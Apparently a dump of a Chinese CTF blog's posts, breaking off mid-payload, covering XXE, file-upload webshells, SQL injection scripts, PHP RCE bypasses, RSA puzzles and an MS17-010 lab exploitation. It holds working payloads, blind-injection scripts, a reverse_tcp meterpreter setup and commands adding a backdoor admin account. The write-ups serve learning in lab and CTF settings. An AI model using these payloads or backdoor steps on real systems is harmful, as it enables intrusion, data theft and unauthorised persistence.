['suctf', 'cc/usr'] ['file', 'suctf.cc/usr', '/local/nginx/conf/nginx.conf', '', ''] file://suctf.cc/usr/local/nginx/conf/nginx.conf 找出类似可用字符的脚本 # coding:utf-8 for i in range(128,65537): tmp=chr(i) try: res = tmp.encode('idna').decode('utf-8') if(\"-\") in res: continue print(\"U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; \".format(tmp, res, i)) except: pass 参考： https://blog.csdn.net/qq_42181428/article/details/99741920 [NCTF2019]Fake XML cookbookxxe攻击 抓包显示的结果是 &lt;user&gt;&lt;username&gt;a&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。 xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。 php引用外部实体，常见的协议 file://文件绝对路径 如：file:///etc/passwd http://url/file.txt php://filter/read=convert.base64-encode/resource=xxx.php 这篇博客写的很清楚，传送门 直接构造payload，拿到flag &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;!DOCTYPE hack [ &lt;!ENTITY file SYSTEM \"file:///flag\"&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 这里的file是外部实体 &file; 这里的&amp;file是xml中的参数 还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码 直接构造 &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;!DOCTYPE hack [ &lt;!ENTITY file SYSTEM \"php://filter/read=convert.base64-encode/resource=doLogin.php\"&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。 &lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = 'admin'; //璐﹀彿 $PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //瀵嗙爜 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,$username); &#125;else&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,$e-&gt;getMessage()); &#125; header('Content-Type: text/html; charset=utf-8'); echo $result; ?&gt; [GXYCTF2019]禁止套娃.git源码泄露 &lt;?php include \"flag.php\"; echo \"flag在哪里呢？&lt;br&gt;\"; if(isset($_GET['exp']))&#123; if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123; // echo $_GET['exp']; @eval($_GET['exp']); &#125; else&#123; die(\"还差一点哦！\"); &#125; &#125; else&#123; die(\"再好好想想！\"); &#125; &#125; else&#123; die(\"还想读flag，臭弟弟！\"); &#125; &#125; // highlight_file(__FILE__); ?&gt; 第一个if：常用的伪协议被禁了 第二个if正则匹配，?R 表示引用当前表达式，就比如引用一次：[a-z,_]+[a-z,_]+\\((?R)?\\)，所以一个合法的表达式可以是a(b();)，括号和字符组成的 第三个if就过滤一些函数包含的字符，导致了许多函数无法使用。 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 2.过滤了常用的几个伪协议，不能以伪协议读取文件。 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 4.正则匹配掉了et/na/info等关键字，很多函数都用不了。 5：eval($_GET[‘exp’]); 考察点无参RCE exp： ?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 current() 函数返回数组中的当前元素的值。 每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 提示：该函数不会移动数组内部指针。要做到这一点，请使用 next() 和 prev() 函数。 相关的方法： end() - 将内部指针指向数组中的最后一个元素，并输出 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset() - 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 array_reverse() 函数以相反的元素顺序返回数组。 array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。 如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。 详情 array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。 如果原数组中的值的数据类型不是字符串或整数，函数将报错。","tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://sunzhengyu99.github.io/tags/ssrf/"},{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"system","slug":"system","permalink":"https://sunzhengyu99.github.io/tags/system/"},{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"buuctf-upload","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-upload/","text":"buuctf-upload [MRCTF2020]你传你🐎呢先上传一个图片，发现上传成功了，还给出了文件的保存路径 再尝试上传1.php但是出现了，报错提示 首先尝试的是，将Content-Type: image/jpeg改为图片类型，但是还是无法上传 再尝试一下.htaccess文件 文件内容 SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; 上传成功后，再上传包含一句话木马的 a.jpg文件，.htaccess文件的作用就是将指定类型的文件当作php文件运行 所以表面上是jpg类型的文件，但是是当作php文件 上传成功后，蚁剑访问url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg 密码为：cmd [SUCTF 2019]CheckIn试着上传php文件，提示非法后缀名，继续修改后缀名，发现php3,php5,phtml等可执行文件后不可上传 想到上传.htacess文件，但是也提示了非法后缀名，这个方法行不通了 但是之前做upload-labs中还有一个上传.user.ini的文件 .user.ini是什么 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 .user.ini的作用 可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell 传送门 开始做题 上传.user.ini文件 GIF89a是GIF文件内容开头的几个字符，其作用是为类绕过exif_imagetype() 上传1.gif 文件保存的路径已经给出，开始蚁剑链接的连接是 url/uploads/04b0951938d905b41348c1548f9c338b/1.gif 但是一直连接不上 后来链接index.php才连接上，这里想到了.user.ini作用，是让所有的php文件包含整个一句话木马，而这里文件路径存在一个index.php，所有说index.php中也存在这个一句话木马 /uploads/04b0951938d905b41348c1548f9c338b/index.php","tags":[{"name":".htacess","slug":"htacess","permalink":"https://sunzhengyu99.github.io/tags/htacess/"},{"name":".user.ini","slug":"user-ini","permalink":"https://sunzhengyu99.github.io/tags/user-ini/"}]},{"title":"buuctf-sql注入","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuctf–注入篇 [CISCN2019 华北赛区 Day2 Web1]Hack World给了提示，All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; 猜测flag在flag 表中，查询语句应该是 select flag from flag 经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注 构造盲注语句 id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) 两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。 // 二分注入 import requests url = \"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php\" data = &#123;id : \"\"&#125; flag = \"\" for i in range(50): left = 33 right = 128 mid = (right + left) &gt;&gt; 1 while(right&gt;left): data[\"id\"] = \"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)\".format(i,mid) response = requests.post(url,data=data) if \"Hello\" in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) [极客大挑战 2019]HardSQL报错注入 测试发现or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过 可是使用报错注入 报错注入原理： 其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。 相关链接 https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据 查询语句如下 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来 显示后面的flag ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [网鼎杯 2018]Fakebooksql注入+反序列化+代码审计 [GXYCTF2019]BabySQli下载的源码，有助于后面做题 mysqli_query($con,'SET NAMES UTF8'); $name = $_POST['name']; $password = $_POST['pw']; $t_pw = md5($password); //对传入的password参数进行了md5加密 $sql = \"select * from user where username = '\".$name.\"'\"; // echo $sql; $result = mysqli_query($con, $sql); if(preg_match(\"/\\(|\\)|\\=|or/\", $name))&#123; // 过滤了() | = or die(\"do not hack me!\"); &#125; else&#123; if (!$result) &#123; printf(\"Error: %s\\n\", mysqli_error($con)); exit(); &#125; else&#123; // echo '&lt;pre&gt;'; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == \"admin\")&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(\"wrong pass!\"); &#125; &#125; else&#123; die(\"wrong user!\"); &#125; &#125; &#125; 随便输入用户名和密码，查看源码，出现提示 试了试应该是base32，解码后是base64 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续解码 select * from user where username = '$name' 注入点是name参数这里，与上面源码中的查询语句一样。 经过测试发现有三列，name=admin&#39; union select 1,2,3 #&amp;pw=as#显示正常，name=admn&#39; union select 1,2,3,4#&amp;pw=as报错 但是页面没有数字回显，所以常规的注入应该是不行的。 值得注意的是，这题可以知道username是admin， 输入username=admin&amp;password=11,时提示wrong pass! 输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin 接下来介绍一种新的union注入 先建立一张表 select * from test where id=0 union select 1,'admin','2322'; union语句后查询的是表中不存在的一个数据，查询结果如下 这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表，其中放着所查询到的数据和union后包含的数据 这里就是 id=1,username=admin,password=2322 这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录 接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了 name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11提示的wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11提示的wrong pass! 第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知） payload: name=000'union select 1,'admin','b59c67bf196a4758191e42f76670ceba'#&amp;pw=1111 b59c67bf196a4758191e42f76670ceba是1111的md5值，pw的值为1111","tags":[{"name":"二分注入","slug":"二分注入","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"union新姿势","slug":"union新姿势","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"BJDCTF2020","date":"2020-09-28T12:26:38.000Z","path":"2020/09/28/BJDCTF2020/","text":"BJDCTF-web easy md5F12看到了提示，给出了sql语句 Hint: select * from 'admin' where password=md5($pass,true) 这里是将输入的密码进行了一次md5的加密 md5()函数介绍 这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。 select * from &#39;admin&#39; where password=&#39; or &#39;sdaa 这里经常使用的字符串是ffifdyop，该字符串md5加密后若raw参数为True时会返回 ‘or’6&lt;trash&gt; (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉) 查询语句为 select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;此查询语句结果为真 提交 ffifdyop后会跳转到另外的页面，查看源码 这里直接利用md5()函数不能处理数组的特性，get提交 ?a[]=1&amp;b[]=2 接下来还有一次跳转，直接post param1[]=1&amp;param2[]=2，拿到flag 不过如此&lt;?php error_reporting(0); $text = $_GET[\"text\"]; //get 获取一个参数text 使用data伪协议 $file = $_GET[\"file\"]; //file参数，这里可以使用filter伪协议读取php页面源码 if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\"))&#123; //text 的内容位I have a dream echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; //file参数不能包含flag die(\"Not now!\"); &#125; include($file); //next.php 提示了下一个页面的名字 &#125; else&#123; highlight_file(__FILE__); &#125; ?&gt; 看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload: ?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php 对到了index.php页面的base64源码，解码后如下 index.php &lt;?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) &#123; return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); &#125; foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). \"\\n\"; &#125; function getFlag()&#123; @eval($_GET['cmd']); &#125; 利用preg_replace()使用的/e模式可以存在远程执行代码 在next.php在输入 next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(\"cat /flag\"); php伪协议 preg_replace /e模式漏洞详解 The mystery of ip进入页面不知道干啥，随便点点，到flag.php时显示了IP地址 查看原码发现提示&lt;!-- Do you know why i know your ip? --&gt; 猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1 这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去 首先试试system(&quot;ls /&quot;),但是发现没有被执行，于是家上括号{system(&quot;ls /&quot;)}，这次执行成功 获取flag: &#123;system(\"cat /flag\")&#125;","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php伪协议","slug":"php伪协议","permalink":"https://sunzhengyu99.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"网安作业1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动ｍｓｆ 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"cumtctf","date":"2020-09-27T13:26:44.000Z","path":"2020/09/27/cumtctf/","text":"CUMTCTF-wp Web签到提示GET一个1,那就 url+?1 提示post一个2 那就post一个 注意的是要2=任意字符才出现源码 审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接php://filter/read=convert.base64-encode/resource=flag.php，读取base64源码之后解码即可 PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs= babysql首先判断是否存在注入username=admin&amp;password=pw&#39; 在后面加上单引号后出现报错提示，确认有注入点 但是继续测试 &#39;or 1=1 #会出现 判断存在黑名单过滤。 接下来就是判断是将什么加入黑名单了，经过字典测试发现是空格，这里可以使用/**/绕过。 先测试有多少列，&#39;union/**/select/**/1,2,3,4,5,6,7# 到第七的时候，页面报错。 &#39;union/**/select/**/1,2,3,4,5,6,7,8# 到第八的时候显示下图，说明一共八列，并且第四列出现回显。 爆表 username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(TABLE_NAME),5,6,7,8/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=database()# 爆列名 username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(COLUMN_NAME),5,6,7,8/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME='users'# user_id,first_name,last_name,user,password,avatar,last_login,failed_login列名很多，选择password 爆flag username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(password),5,6,7,8/**/from/**/users# secret扫描一下目录发现存在一个www.zip的文件，直接下载得到源码，下面就是一层一层的绕过 &lt;?php error_reporting(0); include_once('flag.php'); if(isset($_GET['param1'])) &#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125; &#125; ?&gt; 首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议 param2要在3600*24*30和3600*24*31之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值 对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。 点这里 完整的payload： ?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7 POST: param1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;param2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值 babysql2查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字 在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。 url = 'http://219.219.61.234:20004/' password = \"\" string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;']#将字母转换为ascii码 a = '0x5e' # '\\'的ascii码值 while(1): for j in string: if (hex(j)[2:]=='7b'): str='5c'+hex(j)[2:] #将'&#123;'转义， else: str=hex(j)[2:] time.sleep(0.1) payload =\"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#\" % (a + str) # 盲注的查询语句 regexp binary 是区分大小写的正则匹配 data =&#123;\"username\":\"\\\\\",\"password\":payload&#125; print(data) r = requests.post(url,data=data) #访问 if \"success\" in r.text: #print(r.text) password+=chr(j) print(password) a+=str break if \"wrong\" in r.text: break print(password) Crypto幼儿园的密码题先转换为十进制后在线分解后直接上脚本 http://www.factordb.com/ 在线分解网址 import binascii import sys sys.setrecursionlimit(1000000) def ByteToHex(bins): return ''.join([\"%02X\" % x for x in bins]).strip() def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1')) def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: print('modular inverse does not exist') return 'null' else: return x % m c = 40448992051548719008529549070468060415257485938698092782029814901918646701101 p = 328413456989577256301798468872388310877 q = 324350545929838254331191385863847627003 e = 65537 n = p * q d = modinv(e, (p - 1) * (q - 1)) m = pow(c, d, n) print (m) 数字转字符的脚本 import binascii def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1')) print(n2s(a)) #a为上一个脚本计算出的数字 小学生的密码题初中生的密码题次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。 仔细看题会发现这题的条件给的比较多,知道p-q 于是想到了(p+q)^2-(p-q)^2=4pq=4n，可以算出p+q,之后解出p,q 算p,q的脚本 # -*- coding = utf - 8 -*- #@Time : 2020/9/24 21:55 #@Author : sunzy #@File : su.py import gmpy2 n = 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397 p_sub_q = -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636 x = (4*n+p_sub_q*p_sub_q) gmpy2.mpz(x) #p_add_q = gmpy2.iroot(x, 2) p_add_q = 58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078 # print(p_add_q) y=(p_sub_q+p_add_q) z=(p_add_q-p_sub_q) print(y&gt;&gt;1) print(z&gt;&gt;1) 知道p,q后，此题的解法与幼儿园的解法相同 菜鸡只会这么多。。。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"rsa","slug":"rsa","permalink":"https://sunzhengyu99.github.io/tags/rsa/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"攻防世界-fakebook感觉挺有意思的一道题，所以记录一下吧 0x01发现注入点进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# 爆出一大堆列名。直接读取data的内容 no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from 